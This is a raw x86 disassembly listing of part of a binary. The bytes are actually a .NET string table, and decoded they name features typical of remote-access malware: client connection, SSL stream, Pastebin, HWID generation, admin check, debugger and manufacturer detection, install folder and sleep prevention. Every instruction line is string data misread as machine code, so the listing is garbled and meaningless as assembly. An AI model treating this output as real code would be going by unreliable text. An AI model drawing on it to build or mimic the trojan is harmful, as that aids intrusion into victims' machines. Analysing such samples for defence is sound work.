  408771:	75 6c                	jne    0x4087df
  408773:	6c                   	insb   (%dx),%es:(%edi)
  408774:	00 4d 75             	add    %cl,0x75(%ebp)
  408777:	74 65                	je     0x4087de
  408779:	78 43                	js     0x4087be
  40877b:	6f                   	outsl  %ds:(%esi),(%dx)
  40877c:	6e                   	outsb  %ds:(%esi),(%dx)
  40877d:	74 72                	je     0x4087f1
  40877f:	6f                   	outsl  %ds:(%esi),(%dx)
  408780:	6c                   	insb   (%dx),%es:(%edi)
  408781:	00 45 6e             	add    %al,0x6e(%ebp)
  408784:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408787:	65 32 53 74          	xor    %gs:0x74(%ebx),%dl
  40878b:	72 65                	jb     0x4087f2
  40878d:	61                   	popa
  40878e:	6d                   	insl   (%dx),%es:(%edi)
  40878f:	00 46 69             	add    %al,0x69(%esi)
  408792:	6c                   	insb   (%dx),%es:(%edi)
  408793:	65 53                	gs push %ebx
  408795:	74 72                	je     0x408809
  408797:	65 61                	gs popa
  408799:	6d                   	insl   (%dx),%es:(%edi)
  40879a:	00 4e 65             	add    %cl,0x65(%esi)
  40879d:	74 77                	je     0x408816
  40879f:	6f                   	outsl  %ds:(%esi),(%dx)
  4087a0:	72 6b                	jb     0x40880d
  4087a2:	53                   	push   %ebx
  4087a3:	74 72                	je     0x408817
  4087a5:	65 61                	gs popa
  4087a7:	6d                   	insl   (%dx),%es:(%edi)
  4087a8:	00 53 73             	add    %dl,0x73(%ebx)
  4087ab:	6c                   	insb   (%dx),%es:(%edi)
  4087ac:	53                   	push   %ebx
  4087ad:	74 72                	je     0x408821
  4087af:	65 61                	gs popa
  4087b1:	6d                   	insl   (%dx),%es:(%edi)
  4087b2:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  4087b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4087b7:	64 65 46             	fs gs inc %esi
  4087ba:	72 6f                	jb     0x40882b
  4087bc:	6d                   	insl   (%dx),%es:(%edi)
  4087bd:	53                   	push   %ebx
  4087be:	74 72                	je     0x408832
  4087c0:	65 61                	gs popa
  4087c2:	6d                   	insl   (%dx),%es:(%edi)
  4087c3:	00 43 72             	add    %al,0x72(%ebx)
  4087c6:	79 70                	jns    0x408838
  4087c8:	74 6f                	je     0x408839
  4087ca:	53                   	push   %ebx
  4087cb:	74 72                	je     0x40883f
  4087cd:	65 61                	gs popa
  4087cf:	6d                   	insl   (%dx),%es:(%edi)
  4087d0:	00 47 5a             	add    %al,0x5a(%edi)
  4087d3:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  4087da:	6d                   	insl   (%dx),%es:(%edi)
  4087db:	00 4d 65             	add    %cl,0x65(%ebp)
  4087de:	6d                   	insl   (%dx),%es:(%edi)
  4087df:	6f                   	outsl  %ds:(%esi),(%dx)
  4087e0:	72 79                	jb     0x40885b
  4087e2:	53                   	push   %ebx
  4087e3:	74 72                	je     0x408857
  4087e5:	65 61                	gs popa
  4087e7:	6d                   	insl   (%dx),%es:(%edi)
  4087e8:	00 50 72             	add    %dl,0x72(%eax)
  4087eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4087ec:	67 72 61             	addr16 jb 0x408850
  4087ef:	6d                   	insl   (%dx),%es:(%edi)
  4087f0:	00 67 65             	add    %ah,0x65(%edi)
  4087f3:	74 5f                	je     0x408854
  4087f5:	49                   	dec    %ecx
  4087f6:	74 65                	je     0x40885d
  4087f8:	6d                   	insl   (%dx),%es:(%edi)
  4087f9:	00 67 65             	add    %ah,0x65(%edi)
  4087fc:	74 5f                	je     0x40885d
  4087fe:	49                   	dec    %ecx
  4087ff:	73 36                	jae    0x408837
  408801:	34 42                	xor    $0x42,%al
  408803:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  40880a:	74 
  40880b:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  408812:	65 6d                	gs insl (%dx),%es:(%edi)
  408814:	00 43 6c             	add    %al,0x6c(%ebx)
  408817:	69 65 6e 74 2e 41 6c 	imul   $0x6c412e74,0x6e(%ebp),%esp
  40881e:	67 6f                	outsl  %ds:(%si),(%dx)
  408820:	72 69                	jb     0x40888b
  408822:	74 68                	je     0x40888c
  408824:	6d                   	insl   (%dx),%es:(%edi)
  408825:	00 53 79             	add    %dl,0x79(%ebx)
  408828:	6d                   	insl   (%dx),%es:(%edi)
  408829:	6d                   	insl   (%dx),%es:(%edi)
  40882a:	65 74 72             	gs je  0x40889f
  40882d:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408834:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  40883b:	79 
  40883c:	6d                   	insl   (%dx),%es:(%edi)
  40883d:	6d                   	insl   (%dx),%es:(%edi)
  40883e:	65 74 72             	gs je  0x4088b3
  408841:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408848:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  40884f:	73 
  408850:	68 41 6c 67 6f       	push   $0x6f676c41
  408855:	72 69                	jb     0x4088c0
  408857:	74 68                	je     0x4088c1
  408859:	6d                   	insl   (%dx),%es:(%edi)
  40885a:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  40885e:	6d                   	insl   (%dx),%es:(%edi)
  40885f:	00 52 61             	add    %dl,0x61(%edx)
  408862:	6e                   	outsb  %ds:(%esi),(%dx)
  408863:	64 6f                	outsl  %fs:(%esi),(%dx)
  408865:	6d                   	insl   (%dx),%es:(%edi)
  408866:	00 49 43             	add    %cl,0x43(%ecx)
  408869:	72 79                	jb     0x4088e4
  40886b:	70 74                	jo     0x4088e1
  40886d:	6f                   	outsl  %ds:(%esi),(%dx)
  40886e:	54                   	push   %esp
  40886f:	72 61                	jb     0x4088d2
  408871:	6e                   	outsb  %ds:(%esi),(%dx)
  408872:	73 66                	jae    0x4088da
  408874:	6f                   	outsl  %ds:(%esi),(%dx)
  408875:	72 6d                	jb     0x4088e4
  408877:	00 4d 73             	add    %cl,0x73(%ebp)
  40887a:	67 50                	addr16 push %eax
  40887c:	61                   	popa
  40887d:	63 6b 45             	arpl   %ebp,0x45(%ebx)
  408880:	6e                   	outsb  %ds:(%esi),(%dx)
  408881:	75 6d                	jne    0x4088f0
  408883:	00 57 72             	add    %dl,0x72(%edi)
  408886:	69 74 65 42 6f 6f 6c 	imul   $0x656c6f6f,0x42(%ebp,%eiz,2),%esi
  40888d:	65 
  40888e:	61                   	popa
  40888f:	6e                   	outsb  %ds:(%esi),(%dx)
  408890:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  408894:	6f                   	outsl  %ds:(%esi),(%dx)
  408895:	6f                   	outsl  %ds:(%esi),(%dx)
  408896:	6c                   	insb   (%dx),%es:(%edi)
  408897:	65 61                	gs popa
  408899:	6e                   	outsb  %ds:(%esi),(%dx)
  40889a:	00 53 65             	add    %dl,0x65(%ebx)
  40889d:	74 41                	je     0x4088e0
  40889f:	73 42                	jae    0x4088e3
  4088a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4088a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4088a3:	6c                   	insb   (%dx),%es:(%edi)
  4088a4:	65 61                	gs popa
  4088a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4088a7:	00 48 77             	add    %cl,0x77(%eax)
  4088aa:	69 64 47 65 6e 00 6c 	imul   $0x656c006e,0x65(%edi,%eax,2),%esp
  4088b1:	65 
  4088b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4088b3:	00 63 68             	add    %ah,0x68(%ebx)
  4088b6:	69 6c 64 72 65 6e 00 	imul   $0x4d006e65,0x72(%esp,%eiz,2),%ebp
  4088bd:	4d 
  4088be:	61                   	popa
  4088bf:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  4088c6:	43                   	inc    %ebx
  4088c7:	68 61 69 6e 00       	push   $0x6e6961
  4088cc:	63 68 61             	arpl   %ebp,0x61(%eax)
  4088cf:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  4088d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4088d7:	6d                   	insl   (%dx),%es:(%edi)
  4088d8:	61                   	popa
  4088d9:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4088e0:	43                   	inc    %ebx
  4088e1:	75 72                	jne    0x408955
  4088e3:	72 65                	jb     0x40894a
  4088e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4088e6:	74 44                	je     0x40892c
  4088e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4088e9:	6d                   	insl   (%dx),%es:(%edi)
  4088ea:	61                   	popa
  4088eb:	69 6e 00 50 61 73 74 	imul   $0x74736150,0x0(%esi),%ebp
  4088f2:	65 62 69 6e          	bound  %ebp,%gs:0x6e(%ecx)
  4088f6:	00 49 73             	add    %cl,0x73(%ecx)
  4088f9:	41                   	inc    %ecx
  4088fa:	64 6d                	fs insl (%dx),%es:(%edi)
  4088fc:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  408903:	00 47 65             	add    %al,0x65(%edi)
  408906:	74 46                	je     0x40894e
  408908:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  40890f:	57 
  408910:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  408917:	78 
  408918:	74 65                	je     0x40897f
  40891a:	6e                   	outsb  %ds:(%esi),(%dx)
  40891b:	73 69                	jae    0x408986
  40891d:	6f                   	outsl  %ds:(%esi),(%dx)
  40891e:	6e                   	outsb  %ds:(%esi),(%dx)
  40891f:	00 67 65             	add    %ah,0x65(%edi)
  408922:	74 5f                	je     0x408983
  408924:	4f                   	dec    %edi
  408925:	53                   	push   %ebx
  408926:	56                   	push   %esi
  408927:	65 72 73             	gs jb  0x40899d
  40892a:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408931:	74 65                	je     0x408998
  408933:	6d                   	insl   (%dx),%es:(%edi)
  408934:	2e 49                	cs dec %ecx
  408936:	4f                   	dec    %edi
  408937:	2e 43                	cs inc %ebx
  408939:	6f                   	outsl  %ds:(%esi),(%dx)
  40893a:	6d                   	insl   (%dx),%es:(%edi)
  40893b:	70 72                	jo     0x4089af
  40893d:	65 73 73             	gs jae 0x4089b3
  408940:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  408947:	6c                   	insb   (%dx),%es:(%edi)
  408948:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40894f:	00 53 79             	add    %dl,0x79(%ebx)
  408952:	73 74                	jae    0x4089c8
  408954:	65 6d                	gs insl (%dx),%es:(%edi)
  408956:	2e 53                	cs push %ebx
  408958:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40895c:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  408963:	68 
  408964:	65 6e                	outsb  %gs:(%esi),(%dx)
  408966:	74 69                	je     0x4089d1
  408968:	63 61 74             	arpl   %esp,0x74(%ecx)
  40896b:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408972:	74 65                	je     0x4089d9
  408974:	6d                   	insl   (%dx),%es:(%edi)
  408975:	2e 52                	cs push %edx
  408977:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40897a:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40897f:	6e                   	outsb  %ds:(%esi),(%dx)
  408980:	00 58 35             	add    %bl,0x35(%eax)
  408983:	30 39                	xor    %bh,(%ecx)
  408985:	43                   	inc    %ebx
  408986:	65 72 74             	gs jb  0x4089fd
  408989:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408990:	43                   	inc    %ebx
  408991:	6f                   	outsl  %ds:(%esi),(%dx)
  408992:	6c                   	insb   (%dx),%es:(%edi)
  408993:	6c                   	insb   (%dx),%es:(%edi)
  408994:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408999:	6e                   	outsb  %ds:(%esi),(%dx)
  40899a:	00 4d 61             	add    %cl,0x61(%ebp)
  40899d:	6e                   	outsb  %ds:(%esi),(%dx)
  40899e:	61                   	popa
  40899f:	67 65 6d             	gs insl (%dx),%es:(%di)
  4089a2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089a4:	74 4f                	je     0x4089f5
  4089a6:	62 6a 65             	bound  %ebp,0x65(%edx)
  4089a9:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  4089ad:	6c                   	insb   (%dx),%es:(%edi)
  4089ae:	6c                   	insb   (%dx),%es:(%edi)
  4089af:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4089b5:	00 43 6c             	add    %al,0x6c(%ebx)
  4089b8:	69 65 6e 74 2e 43 6f 	imul   $0x6f432e74,0x6e(%ebp),%esp
  4089bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c7:	00 73 65             	add    %dh,0x65(%ebx)
  4089ca:	74 5f                	je     0x408a2b
  4089cc:	50                   	push   %eax
  4089cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4089ce:	73 69                	jae    0x408a39
  4089d0:	74 69                	je     0x408a3b
  4089d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4089d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4089d4:	00 70 6f             	add    %dh,0x6f(%eax)
  4089d7:	73 69                	jae    0x408a42
  4089d9:	74 69                	je     0x408a44
  4089db:	6f                   	outsl  %ds:(%esi),(%dx)
  4089dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4089dd:	00 43 72             	add    %al,0x72(%ebx)
  4089e0:	79 70                	jns    0x408a52
  4089e2:	74 6f                	je     0x408a53
  4089e4:	67 72 61             	addr16 jb 0x408a48
  4089e7:	70 68                	jo     0x408a51
  4089e9:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  4089f0:	74 69                	je     0x408a5b
  4089f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4089f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4089f4:	00 41 72             	add    %al,0x72(%ecx)
  4089f7:	67 75 6d             	addr16 jne 0x408a67
  4089fa:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089fc:	74 4e                	je     0x408a4c
  4089fe:	75 6c                	jne    0x408a6c
  408a00:	6c                   	insb   (%dx),%es:(%edi)
  408a01:	45                   	inc    %ebp
  408a02:	78 63                	js     0x408a67
  408a04:	65 70 74             	gs jo  0x408a7b
  408a07:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  408a0e:	75 6d                	jne    0x408a7d
  408a10:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a12:	74 45                	je     0x408a59
  408a14:	78 63                	js     0x408a79
  408a16:	65 70 74             	gs jo  0x408a8d
  408a19:	69 6f 6e 00 55 6e 6b 	imul   $0x6b6e5500,0x6e(%edi),%ebp
  408a20:	6e                   	outsb  %ds:(%esi),(%dx)
  408a21:	6f                   	outsl  %ds:(%esi),(%dx)
  408a22:	77 6e                	ja     0x408a92
  408a24:	00 49 6d             	add    %cl,0x6d(%ecx)
  408a27:	61                   	popa
  408a28:	67 65 43             	addr16 gs inc %ebx
  408a2b:	6f                   	outsl  %ds:(%esi),(%dx)
  408a2c:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  408a31:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a33:	00 53 65             	add    %dl,0x65(%ebx)
  408a36:	6e                   	outsb  %ds:(%esi),(%dx)
  408a37:	64 49                	fs dec %ecx
  408a39:	6e                   	outsb  %ds:(%esi),(%dx)
  408a3a:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a3c:	00 46 69             	add    %al,0x69(%esi)
  408a3f:	6c                   	insb   (%dx),%es:(%edi)
  408a40:	65 49                	gs dec %ecx
  408a42:	6e                   	outsb  %ds:(%esi),(%dx)
  408a43:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a45:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  408a49:	76 65                	jbe    0x408ab0
  408a4b:	49                   	dec    %ecx
  408a4c:	6e                   	outsb  %ds:(%esi),(%dx)
  408a4d:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a4f:	00 46 69             	add    %al,0x69(%esi)
  408a52:	6c                   	insb   (%dx),%es:(%edi)
  408a53:	65 53                	gs push %ebx
  408a55:	79 73                	jns    0x408aca
  408a57:	74 65                	je     0x408abe
  408a59:	6d                   	insl   (%dx),%es:(%edi)
  408a5a:	49                   	dec    %ecx
  408a5b:	6e                   	outsb  %ds:(%esi),(%dx)
  408a5c:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a5e:	00 43 6f             	add    %al,0x6f(%ebx)
  408a61:	6d                   	insl   (%dx),%es:(%edi)
  408a62:	70 75                	jo     0x408ad9
  408a64:	74 65                	je     0x408acb
  408a66:	72 49                	jb     0x408ab1
  408a68:	6e                   	outsb  %ds:(%esi),(%dx)
  408a69:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a6b:	00 43 53             	add    %al,0x53(%ebx)
  408a6e:	68 61 72 70 41       	push   $0x41707261
  408a73:	72 67                	jb     0x408adc
  408a75:	75 6d                	jne    0x408ae4
  408a77:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a79:	74 49                	je     0x408ac4
  408a7b:	6e                   	outsb  %ds:(%esi),(%dx)
  408a7c:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a7e:	00 50 72             	add    %dl,0x72(%eax)
  408a81:	6f                   	outsl  %ds:(%esi),(%dx)
  408a82:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a85:	73 53                	jae    0x408ada
  408a87:	74 61                	je     0x408aea
  408a89:	72 74                	jb     0x408aff
  408a8b:	49                   	dec    %ecx
  408a8c:	6e                   	outsb  %ds:(%esi),(%dx)
  408a8d:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a8f:	00 57 72             	add    %dl,0x72(%edi)
  408a92:	69 74 65 4d 61 70 00 	imul   $0x50007061,0x4d(%ebp,%eiz,2),%esi
  408a99:	50 
  408a9a:	72 65                	jb     0x408b01
  408a9c:	76 65                	jbe    0x408b03
  408a9e:	6e                   	outsb  %ds:(%esi),(%dx)
  408a9f:	74 53                	je     0x408af4
  408aa1:	6c                   	insb   (%dx),%es:(%edi)
  408aa2:	65 65 70 00          	gs gs jo 0x408aa6
  408aa6:	5a                   	pop    %edx
  408aa7:	69 70 00 63 75 72 72 	imul   $0x72727563,0x0(%eax),%esi
  408aae:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ab0:	74 41                	je     0x408af3
  408ab2:	70 70                	jo     0x408b24
  408ab4:	00 4d 69             	add    %cl,0x69(%ebp)
  408ab7:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408aba:	73 6f                	jae    0x408b2b
  408abc:	66 74 2e             	data16 je 0x408aed
  408abf:	43                   	inc    %ebx
  408ac0:	53                   	push   %ebx
  408ac1:	68 61 72 70 00       	push   $0x707261
  408ac6:	47                   	inc    %edi
  408ac7:	72 6f                	jb     0x408b38
  408ac9:	75 70                	jne    0x408b3b
  408acb:	00 4e 6f             	add    %cl,0x6f(%esi)
  408ace:	72 6d                	jb     0x408b3d
  408ad0:	61                   	popa
  408ad1:	6c                   	insb   (%dx),%es:(%edi)
  408ad2:	53                   	push   %ebx
  408ad3:	74 61                	je     0x408b36
  408ad5:	72 74                	jb     0x408b4b
  408ad7:	75 70                	jne    0x408b49
  408ad9:	00 53 79             	add    %dl,0x79(%ebx)
  408adc:	73 74                	jae    0x408b52
  408ade:	65 6d                	gs insl (%dx),%es:(%edi)
  408ae0:	2e 4c                	cs dec %esp
  408ae2:	69 6e 71 00 43 6c 65 	imul   $0x656c4300,0x71(%esi),%ebp
  408ae9:	61                   	popa
  408aea:	72 00                	jb     0x408aec
  408aec:	43                   	inc    %ebx
  408aed:	68 61 72 00 49       	push   $0x49007261
  408af2:	6e                   	outsb  %ds:(%esi),(%dx)
  408af3:	76 6f                	jbe    0x408b64
  408af5:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  408af9:	6d                   	insl   (%dx),%es:(%edi)
  408afa:	62 65 72             	bound  %esp,0x72(%ebp)
  408afd:	00 4d 44             	add    %cl,0x44(%ebp)
  408b00:	35 43 72 79 70       	xor    $0x70797243,%eax
  408b05:	74 6f                	je     0x408b76
  408b07:	53                   	push   %ebx
  408b08:	65 72 76             	gs jb  0x408b81
  408b0b:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b12:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  408b19:	41 
  408b1a:	43                   	inc    %ebx
  408b1b:	72 79                	jb     0x408b96
  408b1d:	70 74                	jo     0x408b93
  408b1f:	6f                   	outsl  %ds:(%esi),(%dx)
  408b20:	53                   	push   %ebx
  408b21:	65 72 76             	gs jb  0x408b9a
  408b24:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b2b:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  408b32:	73 
  408b33:	43                   	inc    %ebx
  408b34:	72 79                	jb     0x408baf
  408b36:	70 74                	jo     0x408bac
  408b38:	6f                   	outsl  %ds:(%esi),(%dx)
  408b39:	53                   	push   %ebx
  408b3a:	65 72 76             	gs jb  0x408bb3
  408b3d:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b44:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  408b4b:	72 
  408b4c:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  408b53:	64 65 72 00          	fs gs jb 0x408b57
  408b57:	49                   	dec    %ecx
  408b58:	6e                   	outsb  %ds:(%esi),(%dx)
  408b59:	73 74                	jae    0x408bcf
  408b5b:	61                   	popa
  408b5c:	6c                   	insb   (%dx),%es:(%edi)
  408b5d:	6c                   	insb   (%dx),%es:(%edi)
  408b5e:	46                   	inc    %esi
  408b5f:	6f                   	outsl  %ds:(%esi),(%dx)
  408b60:	6c                   	insb   (%dx),%es:(%edi)
  408b61:	64 65 72 00          	fs gs jb 0x408b65
  408b65:	49                   	dec    %ecx
  408b66:	64 53                	fs push %ebx
  408b68:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b6a:	64 65 72 00          	fs gs jb 0x408b6e
  408b6e:	73 65                	jae    0x408bd5
  408b70:	6e                   	outsb  %ds:(%esi),(%dx)
  408b71:	64 65 72 00          	fs gs jb 0x408b75
  408b75:	4d                   	dec    %ebp
  408b76:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408b7d:	74 2e                	je     0x408bad
  408b7f:	43                   	inc    %ebx
  408b80:	53                   	push   %ebx
  408b81:	68 61 72 70 2e       	push   $0x2e707261
  408b86:	52                   	push   %edx
  408b87:	75 6e                	jne    0x408bf7
  408b89:	74 69                	je     0x408bf4
  408b8b:	6d                   	insl   (%dx),%es:(%edi)
  408b8c:	65 42                	gs inc %edx
  408b8e:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  408b95:	61                   	popa
  408b96:	6c                   	insb   (%dx),%es:(%edi)
  408b97:	6c                   	insb   (%dx),%es:(%edi)
  408b98:	53                   	push   %ebx
  408b99:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  408ba0:	65 
  408ba1:	72 00                	jb     0x408ba3
  408ba3:	47                   	inc    %edi
  408ba4:	65 74 45             	gs je  0x408bec
  408ba7:	6e                   	outsb  %ds:(%esi),(%dx)
  408ba8:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408bab:	65 72 00             	gs jb  0x408bae
  408bae:	67 65 74 5f          	addr16 gs je 0x408c11
  408bb2:	42                   	inc    %edx
  408bb3:	75 66                	jne    0x408c1b
  408bb5:	66 65 72 00          	data16 gs jb 0x408bb9
  408bb9:	73 65                	jae    0x408c20
  408bbb:	74 5f                	je     0x408c1c
  408bbd:	42                   	inc    %edx
  408bbe:	75 66                	jne    0x408c26
  408bc0:	66 65 72 00          	data16 gs jb 0x408bc4
  408bc4:	57                   	push   %edi
  408bc5:	72 69                	jb     0x408c30
  408bc7:	74 65                	je     0x408c2e
  408bc9:	49                   	dec    %ecx
  408bca:	6e                   	outsb  %ds:(%esi),(%dx)
  408bcb:	74 65                	je     0x408c32
  408bcd:	67 65 72 00          	addr16 gs jb 0x408bd1
  408bd1:	67 65 74 5f          	addr16 gs je 0x408c34
  408bd5:	41                   	inc    %ecx
  408bd6:	73 49                	jae    0x408c21
  408bd8:	6e                   	outsb  %ds:(%esi),(%dx)
  408bd9:	74 65                	je     0x408c40
  408bdb:	67 65 72 00          	addr16 gs jb 0x408bdf
  408bdf:	73 65                	jae    0x408c46
  408be1:	74 5f                	je     0x408c42
  408be3:	41                   	inc    %ecx
  408be4:	73 49                	jae    0x408c2f
  408be6:	6e                   	outsb  %ds:(%esi),(%dx)
  408be7:	74 65                	je     0x408c4e
  408be9:	67 65 72 00          	addr16 gs jb 0x408bed
  408bed:	47                   	inc    %edi
  408bee:	65 74 41             	gs je  0x408c32
  408bf1:	73 49                	jae    0x408c3c
  408bf3:	6e                   	outsb  %ds:(%esi),(%dx)
  408bf4:	74 65                	je     0x408c5b
  408bf6:	67 65 72 00          	addr16 gs jb 0x408bfa
  408bfa:	53                   	push   %ebx
  408bfb:	65 74 41             	gs je  0x408c3f
  408bfe:	73 49                	jae    0x408c49
  408c00:	6e                   	outsb  %ds:(%esi),(%dx)
  408c01:	74 65                	je     0x408c68
  408c03:	67 65 72 00          	addr16 gs jb 0x408c07
  408c07:	44                   	inc    %esp
  408c08:	65 74 65             	gs je  0x408c70
  408c0b:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  408c0f:	62 75 67             	bound  %esi,0x67(%ebp)
  408c12:	67 65 72 00          	addr16 gs jb 0x408c16
  408c16:	4d                   	dec    %ebp
  408c17:	61                   	popa
  408c18:	6e                   	outsb  %ds:(%esi),(%dx)
  408c19:	61                   	popa
  408c1a:	67 65 6d             	gs insl (%dx),%es:(%di)
  408c1d:	65 6e                	outsb  %gs:(%esi),(%dx)
  408c1f:	74 4f                	je     0x408c70
  408c21:	62 6a 65             	bound  %ebp,0x65(%edx)
  408c24:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  408c28:	61                   	popa
  408c29:	72 63                	jb     0x408c8e
  408c2b:	68 65 72 00 53       	push   $0x53007265
  408c30:	65 73 73             	gs jae 0x408ca6
  408c33:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408c3a:	6e                   	outsb  %ds:(%esi),(%dx)
  408c3b:	67 45                	addr16 inc %ebp
  408c3d:	76 65                	jbe    0x408ca4
  408c3f:	6e                   	outsb  %ds:(%esi),(%dx)
  408c40:	74 48                	je     0x408c8a
  408c42:	61                   	popa
  408c43:	6e                   	outsb  %ds:(%esi),(%dx)
  408c44:	64 6c                	fs insb (%dx),%es:(%edi)
  408c46:	65 72 00             	gs jb  0x408c49
  408c49:	54                   	push   %esp
  408c4a:	69 6d 65 72 00 6f 77 	imul   $0x776f0072,0x65(%ebp),%ebp
  408c51:	6e                   	outsb  %ds:(%esi),(%dx)
  408c52:	65 72 00             	gs jb  0x408c55
  408c55:	43                   	inc    %ebx
  408c56:	6c                   	insb   (%dx),%es:(%edi)
  408c57:	69 65 6e 74 2e 48 65 	imul   $0x65482e74,0x6e(%ebp),%esp
  408c5e:	6c                   	insb   (%dx),%es:(%edi)
  408c5f:	70 65                	jo     0x408cc6
  408c61:	72 00                	jb     0x408c63
  408c63:	54                   	push   %esp
  408c64:	6f                   	outsl  %ds:(%esi),(%dx)
  408c65:	55                   	push   %ebp
  408c66:	70 70                	jo     0x408cd8
  408c68:	65 72 00             	gs jb  0x408c6b
  408c6b:	44                   	inc    %esp
  408c6c:	65 74 65             	gs je  0x408cd4
  408c6f:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  408c73:	6e                   	outsb  %ds:(%esi),(%dx)
  408c74:	75 66                	jne    0x408cdc
  408c76:	61                   	popa
  408c77:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  408c7b:	65 72 00             	gs jb  0x408c7e
  408c7e:	43                   	inc    %ebx
  408c7f:	75 72                	jne    0x408cf3
  408c81:	72 65                	jb     0x408ce8
  408c83:	6e                   	outsb  %ds:(%esi),(%dx)
  408c84:	74 55                	je     0x408cdb
  408c86:	73 65                	jae    0x408ced
  408c88:	72 00                	jb     0x408c8a
  408c8a:	53                   	push   %ebx
  408c8b:	74 72                	je     0x408cff
  408c8d:	65 61                	gs popa
  408c8f:	6d                   	insl   (%dx),%es:(%edi)
  408c90:	57                   	push   %edi
  408c91:	72 69                	jb     0x408cfc
  408c93:	74 65                	je     0x408cfa
